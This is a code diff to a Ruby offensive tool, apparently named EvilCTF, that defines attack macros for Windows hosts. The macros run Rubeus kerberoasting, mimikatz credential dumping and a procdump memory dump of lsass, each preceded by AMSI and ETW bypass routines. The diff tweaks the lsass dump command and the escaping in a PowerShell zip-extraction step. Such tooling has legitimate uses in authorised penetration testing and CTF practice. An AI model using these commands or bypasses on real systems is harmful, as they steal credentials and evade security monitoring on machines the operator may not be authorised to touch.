@@ -435,7 +435,7 @@ end
       @macros = {
         'kerberoast' => [BYPASS_4MSI_PS, '& "C:\\Users\\Public\\Rubeus.exe" kerberoast /outfile:C:\\Users\\Public\\hashes.txt 2>$null'],
         'dump_creds' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, '& "C:\\Users\\Public\\mimikatz.exe" "privilege::debug" "sekurlsa::logonpasswords" exit 2>$null'],
-        'lsass_dump' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, '& "C:\\Users\\Public\\procdump64.exe" -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp 2>$null'],
+        'lsass_dump' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, '& "C:\\Users\\Public\\procdump64.exe" -accepteula -ma lsass.exe "C:\\Users\\Public\\lsass.dmp"'],
         'invoke-mimikatz' => [
           BYPASS_4MSI_PS,
           ETW_BYPASS_PS,
@@ -696,8 +696,8 @@ end
       # Create PowerShell extraction script
       extract_ps = <<~PS
         try {
-          $zipPath = '#{ps_single_quote_escape(zip_remote_path)}'
-          $extractPath = '#{ps_single_quote_escape(File.dirname(tool[:recommended_remote]))}'
+          $zipPath = '#{EvilCTF::Utils.escape_ps_string(zip_remote_path)}'
+          $extractPath = '#{EvilCTF::Utils.escape_ps_string(File.dirname(tool[:recommended_remote]))}'
           
           Add-Type -AssemblyName System.IO.Compression.FileSystem
           [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $extractPath)
